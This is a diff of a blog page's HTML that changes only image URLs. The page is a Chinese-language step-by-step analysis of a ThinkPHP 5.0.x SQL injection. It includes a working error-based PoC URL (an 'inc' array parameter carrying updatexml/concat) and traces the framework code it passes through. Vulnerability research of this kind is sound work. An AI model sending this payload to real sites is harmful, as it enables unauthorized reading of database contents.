@@ -23,36 +23,36 @@
   <meta name="description" content="poc1http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#x2F;index&#x2F;index&#x2F;thinkphp?username[0]&#x3D;inc&amp;username[1]&#x3D;updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]&#x3D;1  分析定义常量，包含引导文件  直接步出跳转到查询函数 thinkphp()  步进 &#x2F;thinkphp&#x2F;helpe">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ThinkPHP5.0.xSQL注入漏洞分析">
-<meta property="og:url" content="https://kyrie403.github.io/title/index.html">
+<meta property="og:url" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="Blog">
 <meta property="og:description" content="poc1http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#x2F;index&#x2F;index&#x2F;thinkphp?username[0]&#x3D;inc&amp;username[1]&#x3D;updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]&#x3D;1  分析定义常量，包含引导文件  直接步出跳转到查询函数 thinkphp()  步进 &#x2F;thinkphp&#x2F;helpe">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://kyrie403.github.io/title/thinkphp_sql_init_0.png">
-<meta property="og:image" content="https://kyrie403.github.io/title/thinkphp_sql_init_1.png">
-<meta property="og:image" content="https://kyrie403.github.io/title/thinkphp_sql_init_2.png">
-<meta property="og:image" content="https://kyrie403.github.io/title/thinkphp_sql_init_3.png">
-<meta property="og:image" content="https://kyrie403.github.io/title/thinkphp_sql_insert_0.png">
-<meta property="og:image" content="https://kyrie403.github.io/title/thinkphp_sql_insert_1_2.png">
-<meta property="og:image" content="https://kyrie403.github.io/title/thinkphp_sql_insert_1.png">
-<meta property="og:image" content="https://kyrie403.github.io/title/thinkphp_sql_insert_2.png">
-<meta property="og:image" content="https://kyrie403.github.io/title/thinkphp_sql_insert_3.png">
-<meta property="og:image" content="https://kyrie403.github.io/title/thinkphp_sql_insert_4.png">
-<meta property="og:image" content="https://kyrie403.github.io/title/thinkphp_sql_insert_5.png">
-<meta property="og:image" content="https://kyrie403.github.io/title/thinkphp_sql_insert_execute_0.png">
-<meta property="og:image" content="https://kyrie403.github.io/title/thinkphp_sql_insert_execute_1.png">
-<meta property="og:image" content="https://kyrie403.github.io/title/thinkphp_sql_insert_execute_2.png">
-<meta property="og:image" content="https://kyrie403.github.io/title/thinkphp_sql_exception_error_0.png">
-<meta property="og:image" content="https://kyrie403.github.io/title/thinkphp515_sql_8_1.png">
-<meta property="og:image" content="https://kyrie403.github.io/title/thinkphp515_sql_8_2.png">
-<meta property="og:image" content="https://kyrie403.github.io/title/thinkphp_sql_shutdown_0.png">
-<meta property="og:image" content="https://kyrie403.github.io/title/thinkphp_sql_insert_execute_3.png">
+<meta property="og:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_init_0.png">
+<meta property="og:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_init_1.png">
+<meta property="og:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_init_2.png">
+<meta property="og:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_init_3.png">
+<meta property="og:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_0.png">
+<meta property="og:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_1_2.png">
+<meta property="og:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_1.png">
+<meta property="og:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_2.png">
+<meta property="og:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_3.png">
+<meta property="og:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_4.png">
+<meta property="og:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_5.png">
+<meta property="og:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_execute_0.png">
+<meta property="og:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_execute_1.png">
+<meta property="og:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_execute_2.png">
+<meta property="og:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_exception_error_0.png">
+<meta property="og:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp515_sql_8_1.png">
+<meta property="og:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp515_sql_8_2.png">
+<meta property="og:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_shutdown_0.png">
+<meta property="og:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_execute_3.png">
 <meta property="article:published_time" content="2019-11-23T16:00:00.000Z">
 <meta property="article:modified_time" content="2021-09-30T16:02:19.634Z">
 <meta property="article:author" content="kyrie403">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://kyrie403.github.io/title/thinkphp_sql_init_0.png">
+<meta name="twitter:image" content="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_init_0.png">
 
-<link rel="canonical" href="https://kyrie403.github.io/title/">
+<link rel="canonical" href="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
 
 
 <script id="page-configurations">
@@ -170,7 +170,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://kyrie403.github.io/title/">
+    <link itemprop="mainEntityOfPage" href="https://kyrie403.github.io/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -217,65 +217,65 @@
         <h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php/index/index/thinkphp?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]=1</span><br></pre></td></tr></table></figure>
 
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>定义常量，包含引导文件</p>
-<p><img src="/title/thinkphp_sql_init_0.png" alt="thinkphp_sql_init_0"></p>
+<p><img src="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_init_0.png" alt="thinkphp_sql_init_0"></p>
 <p>直接步出跳转到查询函数 <strong>thinkphp()</strong></p>
-<p><img src="/title/thinkphp_sql_init_1.png" alt="thinkphp_sql_init_1"></p>
+<p><img src="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_init_1.png" alt="thinkphp_sql_init_1"></p>
 <p>步进 /thinkphp/helper.php Line195，连接数据库</p>
-<p><img src="/title/thinkphp_sql_init_2.png" alt="thinkphp_sql_init_2"></p>
+<p><img src="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_init_2.png" alt="thinkphp_sql_init_2"></p>
 <p>步出 /thinkphp/library/think/db/Query.php Line937，where方法</p>
-<p><img src="/title/thinkphp_sql_init_3.png" alt="thinkphp_sql_init_3"></p>
+<p><img src="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_init_3.png" alt="thinkphp_sql_init_3"></p>
 <p>步出 跳转到insert函数 Line2079，解析查询表达式获得查询选项赋值给 <strong>$options</strong> -&gt; 合并数组 -&gt;<strong>$this-&gt;builder-&gt;insert()</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span> = [], <span class="variable">$replace</span> = <span class="literal">false</span>, <span class="variable">$getLastInsID</span> = <span class="literal">false</span>, <span class="variable">$sequence</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 分析查询表达式</span></span><br><span class="line">        <span class="variable">$options</span> = <span class="keyword">$this</span>-&gt;parseExpress();</span><br><span class="line">        <span class="variable">$data</span>    = array_merge(<span class="variable">$options</span>[<span class="string">&#x27;data&#x27;</span>], <span class="variable">$data</span>);</span><br><span class="line">        <span class="comment">// 生成SQL语句</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="keyword">$this</span>-&gt;builder-&gt;insert(<span class="variable">$data</span>, <span class="variable">$options</span>, <span class="variable">$replace</span>);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
 
-<p><img src="/title/thinkphp_sql_insert_0.png" alt="thinkphp_sql_insert_0"></p>
+<p><img src="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_0.png" alt="thinkphp_sql_insert_0"></p>
 <p>跟进 <strong>$this-&gt;builder-&gt;insert()</strong> 函数 /thinkphp/library/think/db/Builder.php Line721，从查询选项获得组成SQL语句的变量</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span>, <span class="variable">$options</span> = [], <span class="variable">$replace</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 分析并处理数据</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;parseData(<span class="variable">$data</span>, <span class="variable">$options</span>);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
 
-<p><img src="/title/thinkphp_sql_insert_1_2.png" alt="thinkphp_sql_insert_1_2"></p>
+<p><img src="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_1_2.png" alt="thinkphp_sql_insert_1_2"></p>
 <p>跟进 <strong>parseData()</strong> ，Line86，因为之前获取的 <strong>$options[‘field’]</strong> 值为 <strong>‘*’</strong> ，所以从查询的表中获取列名 <strong>‌$fields：{“id”, “username”, “password”, “token”}[4]</strong> </p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseData</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$options</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取绑定信息</span></span><br><span class="line">    <span class="variable">$bind</span> = <span class="keyword">$this</span>-&gt;query-&gt;getFieldsBind(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;*&#x27;</span> == <span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$fields</span> = array_keys(<span class="variable">$bind</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$fields</span> = <span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
 
-<p><img src="/title/thinkphp_sql_insert_1.png" alt="thinkphp_sql_insert_1"></p>
+<p><img src="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_1.png" alt="thinkphp_sql_insert_1"></p>
 <p>从查询数据变量 <strong>$options</strong>中获得要查询的列名</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...        </span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="variable">$item</span> = <span class="keyword">$this</span>-&gt;parseKey(<span class="variable">$key</span>, <span class="variable">$options</span>);</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>
 
 
 <p>跟进 <strong>parseKey()</strong> /thinkphp/library/think/db/builder/Mysql.php Line89，要查询的列名 <strong>$key</strong>为 <strong>`username`</strong> </p>
-<p><img src="/title/thinkphp_sql_insert_2.png" alt="thinkphp_sql_insert_2"></p>
+<p><img src="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_2.png" alt="thinkphp_sql_insert_2"></p>
 <p>返回/thinkphp/library/think/db/Builder.php 根据 <strong>$val[0]</strong> 也就是GET参数 <strong>username[0]</strong> 判断进入对应的case语句，这里是 <strong>‘inc’</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (is_array(<span class="variable">$val</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">switch</span> (<span class="variable">$val</span>[<span class="number">0</span>]) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;exp&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable">$val</span>[<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;inc&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="keyword">$this</span>-&gt;parseKey(<span class="variable">$val</span>[<span class="number">1</span>]) . <span class="string">&#x27;+&#x27;</span> . floatval(<span class="variable">$val</span>[<span class="number">2</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;dec&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="keyword">$this</span>-&gt;parseKey(<span class="variable">$val</span>[<span class="number">1</span>]) . <span class="string">&#x27;-&#x27;</span> . floatval(<span class="variable">$val</span>[<span class="number">2</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
-<p><img src="/title/thinkphp_sql_insert_3.png" alt="thinkphp_sql_insert_3"></p>
-<p><img src="/title/thinkphp_sql_insert_4.png" alt="thinkphp_sql_insert_4"></p>
+<p><img src="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_3.png" alt="thinkphp_sql_insert_3"></p>
+<p><img src="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_4.png" alt="thinkphp_sql_insert_4"></p>
 <p>Line728 以 <strong>$this-&gt;insertsql</strong>为模板，通过 <strong>str_replace()</strong> 函数替换为获取的查询数据生成insert语句</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">        <span class="variable">$sql</span> = str_replace(</span><br><span class="line">            [<span class="string">&#x27;%INSERT%&#x27;</span>, <span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%DATA%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>],</span><br><span class="line">            [</span><br><span class="line">                <span class="variable">$replace</span> ? <span class="string">&#x27;REPLACE&#x27;</span> : <span class="string">&#x27;INSERT&#x27;</span>,</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseTable(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>], <span class="variable">$options</span>),</span><br><span class="line">                implode(<span class="string">&#x27; , &#x27;</span>, <span class="variable">$fields</span>),</span><br><span class="line">                implode(<span class="string">&#x27; , &#x27;</span>, <span class="variable">$values</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseComment(<span class="variable">$options</span>[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            ], <span class="keyword">$this</span>-&gt;insertSql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sql</span>;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
 <p>组成sql语句的各个变量的值</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">&lt;user</span><br><span class="line"></span><br><span class="line">&gt;<span class="variable">$fields</span></span><br><span class="line">&lt;`username`</span><br><span class="line"></span><br><span class="line">&gt;<span class="variable">$values</span></span><br><span class="line">&lt;<span class="keyword">array</span> (</span><br><span class="line">  <span class="number">0</span> =&gt; <span class="string">&#x27;updatexml(1,concat(0x7e,user(),0x7e),1)+1&#x27;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">&gt;<span class="variable">$options</span>[<span class="string">&#x27;comment&#x27;</span>]</span><br><span class="line">&lt;</span><br><span class="line"></span><br><span class="line">&gt;<span class="keyword">$this</span>-&gt;insertSql</span><br><span class="line">&lt;%INSERT% INTO %TABLE% (%FIELD%) VALUES (%DATA%) %COMMENT%</span><br></pre></td></tr></table></figure>
 
-<p><img src="/title/thinkphp_sql_insert_5.png" alt="thinkphp_sql_insert_5"></p>
+<p><img src="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_5.png" alt="thinkphp_sql_insert_5"></p>
 <p>返回生成的sql语句 <strong>$sql：<br>INSERT INTO `user` (`username`) VALUES (updatexml(1,concat(0x7e,user(),0x7e),1)+1)</strong> /thinkphp/library/think/db/Query.php Line2094，获取执行的SQL语句，因为 <strong>$options[‘fetch_sql’]<strong>的值为</strong>false</strong>所以 <strong>$sql</strong>直接成为实际执行的SQL语句</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) &#123;</span><br><span class="line">            <span class="comment">// 获取实际执行的SQL语句</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;connection-&gt;getRealSql(<span class="variable">$sql</span>, <span class="variable">$bind</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行操作</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="number">0</span> === <span class="variable">$sql</span> ? <span class="number">0</span> : <span class="keyword">$this</span>-&gt;execute(<span class="variable">$sql</span>, <span class="variable">$bind</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
-<p><img src="/title/thinkphp_sql_insert_execute_0.png" alt="thinkphp_sql_insert_execute_0"></p>
+<p><img src="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_execute_0.png" alt="thinkphp_sql_insert_execute_0"></p>
 <p>跟进执行函数，/thinkphp/library/think/db/Connection.php Line411，初始化数据库连接 -&gt; 执行语句 </p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$bind</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;initConnect(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;linkID) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br><span class="line">        	<span class="keyword">$this</span>-&gt;PDOStatement-&gt;execute();</span><br><span class="line">    ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
-<p><img src="/title/thinkphp_sql_insert_execute_1.png" alt="thinkphp_sql_insert_execute_1"></p>
+<p><img src="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_execute_1.png" alt="thinkphp_sql_insert_execute_1"></p>
 <p>PDO异常，异常信息包含poc插入的SQL语句的查询结果</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isBreak(<span class="variable">$e</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;close()-&gt;execute(<span class="variable">$sql</span>, <span class="variable">$bind</span>);</span><br><span class="line">            &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;PDO Error Info&#x27;</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="string">&#x27;SQLSTATE&#x27;</span> =&gt; <span class="string">&#x27;HY000&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Driver Error Code&#x27;</span> =&gt; <span class="number">1105</span>,</span><br><span class="line">      <span class="string">&#x27;Driver Error Message&#x27;</span> =&gt; <span class="string">&#x27;XPATH syntax error: \&#x27;~root@localhost~\&#x27;&#x27;</span>,</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
 
-<p><img src="/title/thinkphp_sql_insert_execute_2.png" alt="thinkphp_sql_insert_execute_2"></p>
+<p><img src="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_execute_2.png" alt="thinkphp_sql_insert_execute_2"></p>
 <p>进行异常处理 /thinkphp/library/think/Error.php Line40</p>
-<p><img src="/title/thinkphp_sql_exception_error_0.png" alt="thinkphp_sql_exception_error_0"></p>
+<p><img src="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_exception_error_0.png" alt="thinkphp_sql_exception_error_0"></p>
 <p>/thinkphp/library/think/Error.php Line86 异常终止处理 -&gt; /thinkphp/library/think/db/Connection.php Line1044 执行析构函数 -&gt; 步进<strong>close()</strong> /thinkphp/library/think/db/Connection.php Line794 关闭数据库连接  </p>
-<p><img src="/title/thinkphp515_sql_8_1.png" alt="thinkphp515_sql_8_1"></p>
-<p><img src="/title/thinkphp515_sql_8_2.png" alt="thinkphp515_sql_8_2"></p>
-<p><img src="/title/thinkphp_sql_shutdown_0.png" alt="thinkphp_sql_shutdown_0"></p>
+<p><img src="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp515_sql_8_1.png" alt="thinkphp515_sql_8_1"></p>
+<p><img src="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp515_sql_8_2.png" alt="thinkphp515_sql_8_2"></p>
+<p><img src="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_shutdown_0.png" alt="thinkphp_sql_shutdown_0"></p>
 <p>poc传入的数据整个过程都未经过有效的安全过滤被带入到数据库中执行，执行的结果被包含到了报错信息中返回到页面(开启debug模式)</p>
-<p><img src="/title/thinkphp_sql_insert_execute_3.png" alt="thinkphp_sql_insert_execute_3"></p>
